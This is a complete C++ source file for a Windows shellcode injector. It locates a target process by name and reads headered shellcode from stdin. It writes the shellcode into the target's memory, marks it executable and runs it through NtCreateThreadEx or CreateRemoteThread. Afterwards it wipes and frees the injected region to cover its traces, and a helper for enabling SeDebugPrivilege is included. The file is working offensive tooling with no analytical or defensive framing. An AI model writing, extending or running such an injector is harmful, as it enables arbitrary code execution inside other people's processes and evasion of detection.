#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <cstdint>
#include <string>
#include <iomanip>
#include <cstring>
#include <cwchar>

#pragma pack(push, 1)
struct ShellcodeHeader {
    uint32_t magic;    
    uint8_t arch;      // 1 = x86, 2 = x64 
    uint32_t length;   
    uint8_t reserved[3];
};
#pragma pack(pop)

constexpr uint32_t EXPECTED_MAGIC = 0x444F4353; 

using NTSTATUS = LONG;
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

using pNtCreateThreadEx = NTSTATUS (NTAPI*)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID
);

bool EnableDebugPrivilege() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    TOKEN_PRIVILEGES tp{};
    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        CloseHandle(hToken);
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}

bool GetProcessIs64Bit(HANDLE hProcess, bool& is64) {
    is64 = false;
    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS2)(HANDLE, USHORT*, USHORT*);
    HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
    if (hKernel) {
        LPFN_ISWOW64PROCESS2 fnIsWow64Process2 = (LPFN_ISWOW64PROCESS2)GetProcAddress(hKernel, "IsWow64Process2");
        if (fnIsWow64Process2) {
            USHORT processMachine = 0, nativeMachine = 0;
            if (fnIsWow64Process2(hProcess, &processMachine, &nativeMachine)) {
                if (processMachine == IMAGE_FILE_MACHINE_UNKNOWN) {
                    processMachine = nativeMachine;
                }
                if (processMachine == IMAGE_FILE_MACHINE_AMD64 || processMachine == IMAGE_FILE_MACHINE_ARM64) {
                    is64 = true;
                } else {
                    is64 = false;
                }
                return true;
            }
        }
    }
    BOOL wow64 = FALSE;
    if (!IsWow64Process(hProcess, &wow64)) {
        return false;
    }
    if (wow64) {
        is64 = false;
        return true;
    }
    SYSTEM_INFO si{};
    GetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        is64 = true;
    } else {
        is64 = false;
    }
    return true;
}

struct OpenProcParams {
    DWORD pid;
    HANDLE result;
};
DWORD WINAPI OpenProcThreadFunc(LPVOID arg) {
    OpenProcParams* p = reinterpret_cast<OpenProcParams*>(arg);
    p->result = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, p->pid);
    return 0;
}
HANDLE TimedOpenProcess(DWORD pid, DWORD timeout_ms) {
    OpenProcParams params{ pid, NULL };
    HANDLE hThread = CreateThread(NULL, 0, OpenProcThreadFunc, &params, 0, NULL);
    if (!hThread)
        return NULL;
    DWORD wait = WaitForSingleObject(hThread, timeout_ms);
    CloseHandle(hThread); 
    if (wait != WAIT_OBJECT_0) {
        return NULL;
    }
    return params.result;
}

bool read_all_from_stdin(std::vector<uint8_t>& out) {
    constexpr size_t CHUNK = 4096;
    uint8_t buffer[CHUNK];
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    if (hStdin == INVALID_HANDLE_VALUE) return false;

    DWORD bytesRead = 0;
    while (true) {
        if (!ReadFile(hStdin, buffer, CHUNK, &bytesRead, NULL)) return false;
        if (bytesRead == 0) break;
        out.insert(out.end(), buffer, buffer + bytesRead);
    }
    return true;
}

void ListAllProcesses() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateToolhelp32Snapshot failed: 0x" << std::hex << GetLastError() << std::dec << "\n";
        return;
    }

    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    if (Process32FirstW(hSnap, &entry)) {
        std::cout << "Process list:\n";
        do {
            std::wcout << L"  PID: " << std::setw(6) << entry.th32ProcessID
                      << L"  Name: " << entry.szExeFile << L"\n";
        } while (Process32NextW(hSnap, &entry));
    } else {
        std::cerr << "Process32First failed: 0x" << std::hex << GetLastError() << std::dec << "\n";
    }
    CloseHandle(hSnap);
}

HANDLE OpenProcessByNameCandidate(const char* name, DWORD& outPid) {
    HANDLE resultHandle = NULL;
    outPid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return NULL;

    // Convert char* to wchar_t*
    wchar_t wideName[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, name, -1, wideName, MAX_PATH);

    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    if (Process32FirstW(hSnap, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, wideName) == 0) {
                HANDLE hProc = TimedOpenProcess(entry.th32ProcessID, 1500);
                if (hProc) {
                    std::wcout << L"Found and opened process: " << entry.szExeFile
                              << L" PID=0x" << std::hex << entry.th32ProcessID << std::dec << L"\n";
                    resultHandle = hProc;
                    outPid = entry.th32ProcessID;
                    break;
                } else {
                    std::wcout << L"Process " << entry.szExeFile << L" PID=0x" << std::hex << entry.th32ProcessID
                              << std::dec << L" found, but could not open within timeout (OpenProcess timed out or failed)\n";
                }
            }
        } while (Process32NextW(hSnap, &entry));
    }
    CloseHandle(hSnap);
    return resultHandle;
}

struct NtThreadParams {
    HANDLE process;
    PVOID start;
    HANDLE thread;
    NTSTATUS status;
    pNtCreateThreadEx fn;
};
DWORD WINAPI NtCreateThreadExWorker(LPVOID arg) {
    NtThreadParams* p = reinterpret_cast<NtThreadParams*>(arg);
    p->status = p->fn(
        &p->thread,
        THREAD_ALL_ACCESS,
        NULL,
        p->process,
        p->start,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL);
    return 0;
}
bool TryNtCreateThreadExWithTimeout(HANDLE targetProc, PVOID remote_base, HANDLE& outThread, DWORD timeout_ms, bool& usedNt) {
    outThread = NULL;
    usedNt = false;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;
    pNtCreateThreadEx fn = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    if (!fn) return false;

    NtThreadParams params{};
    params.process = targetProc;
    params.start = remote_base;
    params.thread = NULL;
    params.fn = fn;

    HANDLE hWorker = CreateThread(NULL, 0, NtCreateThreadExWorker, &params, 0, NULL);
    if (!hWorker) return false;

    DWORD wait = WaitForSingleObject(hWorker, timeout_ms);
    if (wait == WAIT_OBJECT_0) {
        if (NT_SUCCESS(params.status) && params.thread) {
            outThread = params.thread;
            usedNt = true;
            std::cout << "Thread created via NtCreateThreadEx 0x" << std::hex << (uintptr_t)outThread << std::dec << "\n";
            CloseHandle(hWorker);
            return true;
        }
    }
    CloseHandle(hWorker);
    return false;
}

struct CRTParams {
    HANDLE process;
    PVOID start;
    HANDLE thread;
};
DWORD WINAPI CRTWorker(LPVOID arg) {
    CRTParams* p = reinterpret_cast<CRTParams*>(arg);
    p->thread = CreateRemoteThread(p->process, NULL, 0, (LPTHREAD_START_ROUTINE)p->start, NULL, 0, NULL);
    return 0;
}
bool TryCreateRemoteThreadWithTimeout(HANDLE targetProc, PVOID remote_base, HANDLE& outThread, DWORD timeout_ms) {
    outThread = NULL;
    CRTParams params{};
    params.process = targetProc;
    params.start = remote_base;
    params.thread = NULL;

    HANDLE hWorker = CreateThread(NULL, 0, CRTWorker, &params, 0, NULL);
    if (!hWorker) return false;

    DWORD wait = WaitForSingleObject(hWorker, timeout_ms);
    if (wait == WAIT_OBJECT_0) {
        outThread = params.thread;
        if (outThread) {
            std::cout << "Thread created via CreateRemoteThread 0x" << std::hex << (uintptr_t)outThread << std::dec << "\n";
            CloseHandle(hWorker);
            return true;
        }
    }
    CloseHandle(hWorker);
    return false;
}

int main(int argc, char* argv[]) {
    // if (!EnableDebugPrivilege()) {
    //     std::cerr << "Failed to enable SeDebugPrivilege\n";
    // }

    if (argc < 2) {
        std::cout << "Usage: injector.exe <process_name.exe>\n";
        std::cout << "If no name is specified, processes will be listed.\n\n";
        ListAllProcesses();
        return 0;
    }

    const char* targetName = argv[1];
    DWORD pid = 0;
    HANDLE hw = OpenProcessByNameCandidate(targetName, pid);
    if (!hw) {
        std::cerr << "Failed to find or open process with name: " << targetName << "\n";
        return 1;
    }

    bool procIs64 = false;
    if (!GetProcessIs64Bit(hw, procIs64)) {
        std::cerr << "Failed to determine process architecture for PID=0x" << std::hex << pid << std::dec << "\n";
        CloseHandle(hw);
        return 1;
    }

    std::vector<uint8_t> blob;
    if (!read_all_from_stdin(blob)) {
        std::cerr << "Failed to read stdin\n";
        CloseHandle(hw);
        return 1;
    }

    if (blob.size() < sizeof(ShellcodeHeader)) {
        std::cerr << "Too little data: " << blob.size() << " bytes\n";
        CloseHandle(hw);
        return 1;
    }

    ShellcodeHeader header{};
    memcpy(&header, blob.data(), sizeof(header));

    if (header.magic != EXPECTED_MAGIC) {
        std::cerr << "Invalid magic (expected 'SCOD')\n";
        SecureZeroMemory(blob.data(), blob.size());
        SecureZeroMemory(&header, sizeof(header));
        CloseHandle(hw);
        return 1;
    }

    if (header.arch != 1 && header.arch != 2) {
        std::cerr << "Unknown architecture in header: " << (int)header.arch << "\n";
        SecureZeroMemory(blob.data(), blob.size());
        SecureZeroMemory(&header, sizeof(header));
        CloseHandle(hw);
        return 1;
    }

    if ((header.arch == 2 && !procIs64) || (header.arch == 1 && procIs64)) {
        std::cerr << "Architecture mismatch: shellcode "
                  << (header.arch == 2 ? "x64" : "x86")
                  << " is not suitable for process " << (procIs64 ? "x64" : "x86") << "\n";
        SecureZeroMemory(blob.data(), blob.size());
        SecureZeroMemory(&header, sizeof(header));
        CloseHandle(hw);
        return 1;
    }

    if (header.length == 0 || header.length > 3 * 1024 * 1024) {
        std::cerr << "Invalid shellcode length: " << header.length << "\n";
        SecureZeroMemory(blob.data(), blob.size());
        SecureZeroMemory(&header, sizeof(header));
        CloseHandle(hw);
        return 1;
    }

    size_t expected_total = sizeof(ShellcodeHeader) + header.length;
    if (blob.size() < expected_total) {
        std::cerr << "Data is less than specified in header: " << blob.size()
                  << " < " << expected_total << "\n";
        SecureZeroMemory(blob.data(), blob.size());
        SecureZeroMemory(&header, sizeof(header));
        CloseHandle(hw);
        return 1;
    }

    uint8_t* shellcode_ptr = blob.data() + sizeof(ShellcodeHeader);

    void* remote_base = VirtualAllocEx(hw, NULL, header.length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_base) {
        std::cerr << "VirtualAllocEx failed: 0x" << std::hex << GetLastError() << std::dec << "\n";
        SecureZeroMemory(blob.data(), blob.size());
        SecureZeroMemory(&header, sizeof(header));
        CloseHandle(hw);
        return 1;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(hw, remote_base, shellcode_ptr, header.length, &written) || written != header.length) {
        std::cerr << "WriteProcessMemory failed or incomplete (written=" << written << "): 0x"
                  << std::hex << GetLastError() << std::dec << "\n";
        SecureZeroMemory(blob.data(), blob.size());
        SecureZeroMemory(&header, sizeof(header));
        CloseHandle(hw);
        return 1;
    }

    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hw, remote_base, header.length, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "VirtualProtectEx failed to set RX: 0x" << std::hex << GetLastError() << std::dec << "\n";
    }

    HANDLE thread = NULL;
    bool usedNt = false;
    const DWORD THREAD_CREATION_TIMEOUT_MS = 2000;
    if (!TryNtCreateThreadExWithTimeout(hw, remote_base, thread, THREAD_CREATION_TIMEOUT_MS, usedNt)) {
        if (!TryCreateRemoteThreadWithTimeout(hw, remote_base, thread, THREAD_CREATION_TIMEOUT_MS)) {
            std::cerr << "Failed to create thread (both NtCreateThreadEx and CreateRemoteThread failed or timed out)\n";
            SecureZeroMemory(blob.data(), blob.size());
            SecureZeroMemory(&header, sizeof(header));
            CloseHandle(hw);
            return 1;
        }
    }

    const DWORD INITIAL_TIMEOUT_MS = 30000; 
    const DWORD GRACE_PERIOD_MS = 60000;     
    const DWORD POLL_INTERVAL_MS = 500;      // polling

    bool thread_finished = false;
    DWORD waitRes = WaitForSingleObject(thread, INITIAL_TIMEOUT_MS);
    if (waitRes == WAIT_OBJECT_0) {
        std::cout << "Thread finished successfully within initial timeout\n";
        thread_finished = true;
    } else if (waitRes == WAIT_TIMEOUT) {
        std::cerr << "Initial timeout expired (" << INITIAL_TIMEOUT_MS << "ms), entering grace period up to "
                  << GRACE_PERIOD_MS << "ms\n";
        DWORD waited = 0;
        while (waited < GRACE_PERIOD_MS) {
            DWORD r = WaitForSingleObject(thread, POLL_INTERVAL_MS);
            if (r == WAIT_OBJECT_0) {
                std::cout << "Thread finished during grace period\n";
                thread_finished = true;
                break;
            }
            if (r != WAIT_TIMEOUT) {
                std::cerr << "Error waiting for thread in grace period: 0x" << std::hex << GetLastError() << std::dec << "\n";
                break;
            }
            waited += POLL_INTERVAL_MS;
        }
        if (!thread_finished) {
            std::cerr << "Thread still active after grace period. Forced termination.\n";
            if (!TerminateThread(thread, 1)) {
                std::cerr << "TerminateThread failed: 0x" << std::hex << GetLastError() << std::dec << "\n";
            } else {
                std::cerr << "Thread forcefully terminated\n";
            }
            WaitForSingleObject(thread, INFINITE);
            thread_finished = true;
        }
    } else {
        std::cerr << "Error in WaitForSingleObject: 0x" << std::hex << GetLastError() << std::dec << "\n";
    }

    DWORD dummyProtect = 0;
    if (!VirtualProtectEx(hw, remote_base, header.length, PAGE_READWRITE, &dummyProtect)) {
        std::cerr << "VirtualProtectEx revert to RW failed: 0x" << std::hex << GetLastError() << std::dec << "\n";
    } else {
        std::vector<uint8_t> zeroBuf(header.length);
        if (!WriteProcessMemory(hw, remote_base, zeroBuf.data(), header.length, NULL)) {
            std::cerr << "Failed to erase remote shellcode: 0x" << std::hex << GetLastError() << std::dec << "\n";
        }
    }

    if (!VirtualFreeEx(hw, remote_base, 0, MEM_RELEASE)) {
        std::cerr << "VirtualFreeEx failed: 0x" << std::hex << GetLastError() << std::dec << "\n";
    }

    if (!blob.empty()) {
        SecureZeroMemory(blob.data(), blob.size());
    }
    SecureZeroMemory(&header, sizeof(header));

    CloseHandle(thread);
    CloseHandle(hw);
    return 0;
}